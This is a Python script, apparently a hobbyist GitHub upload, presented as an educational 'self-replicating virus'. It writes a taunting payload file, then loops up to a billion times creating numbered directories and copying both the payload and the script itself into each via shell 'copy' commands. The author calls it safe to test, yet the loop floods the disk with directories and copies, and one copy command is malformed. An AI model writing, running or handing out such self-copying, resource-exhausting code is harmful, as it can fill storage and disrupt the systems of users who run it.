'''
	
	BASIC QUINE

	Author : Abhishek Iyengar
	GitHub: https://github.com/tinshade/
	License: GNU Public License


	This is a basic demonstration of a quine (self-replicating virus).
	This is a very contained and easy-to-quarentine virus so don't hesitate
	to test it.

	DISCLAIMER: For educational purposes only! 



'''



import os #To interact with the OS
from sys import argv #To know the name of the script dynamically

#Fetching the name of the last script ran in the CMD via args and storing it in 'name' variable
#Can be refractored by using this directly in the 'f-string line'
#name = str(argv[0])


#To create the payload in case it does not exist. 
def payload():
	with open("payload.txt", "w+") as file:
		file.write("TinShade is in your cyber-space!\n Watch me GO!")
		file.close()
	print("Payload Created!")


#Main Function
def initialization():

	if os.path.isfile('payload.txt') == True:
		cmd = "payload.txt" #Command to be run in the CMD via python
		os.system(cmd) #Running the command in CMD to show the payload file in text editor
		#Adding try-catch to by-pass existing folder error
		try:
			#Setting count to 1 for dynamic renaming. Could also cd into new directory and run the same again as an alternative
			count = 1
			#Set a small range below for testing!
			for count in range(1,1000000000):
				os.mkdir(str(count)) #Making a new directory
				os.system(f'copy payload.txt'+str(count)) #Copying the payload text
				#os.system(f'copy {name} clone') #Refracted this to the following
				os.system (f'copy {str(argv[0])} {str(count)}') #Copying the python script
				count +=1 #Increasing count by 1
			
		except Exception:
			print("I'll let this one pass for now...") 
			#The idea after this is to delete everything in the folder except the script and the payload
			#To make this reusable once this error is hit.

			#I am not doing this here. To re-use, just delete the folders this script made! 

	else:
		print("How about adding a payload next time...") #Mocking you!
		payload() #Creating the payload by calling the payload function above
	
initialization() #Calling the main Function